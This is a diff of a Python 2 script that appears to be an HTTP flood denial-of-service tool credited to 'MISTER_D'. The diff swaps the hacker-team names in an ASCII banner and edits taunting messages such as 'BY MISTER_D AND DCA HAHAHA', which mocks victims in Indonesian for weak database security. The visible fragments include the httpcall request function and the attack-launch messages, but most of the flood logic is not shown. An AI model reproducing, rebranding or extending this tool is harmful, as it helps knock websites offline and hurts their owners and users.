@@ -76,7 +76,7 @@ print \
      -------|    |_______/ |_______/  \______/  \______/     |-------
             |_____________________[MISTER_D]_________________________|
      	                             AND
-                           DDOSER DEFACER TEAM ATTACK
+                   DRAGON CYBER ARMY AND NICROBER CYBER TEAM
 ______________________________________________________________________________
 
 """
@@ -105,7 +105,7 @@ def httpcall(url):
 	except urllib2.HTTPError, e:
 			#print e.code
 			set_flag(1)
- 			print 'BY MISTER_D AND DDOSER_TEAM HAHAHA SISTEM KEAMANAN DATABASE ANDA SANGAT LEMAH SEKALI BUNG :v :p'
+ 			print 'BY MISTER_D AND DCA HAHAHA SISTEM KEAMANAN DATABASE ANDA SANGAT LEMAH SEKALI BUNG :v :p'
 			code=500
 	except urllib2.URLError, e:
 			#print e.reason
@@ -147,7 +147,7 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print "Ddoser_Team attack was been sended This tool is created by : MISTER_D"
+		print "Dragon Cyber Army was been sended This tool is created by : MISTER_D"
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe()
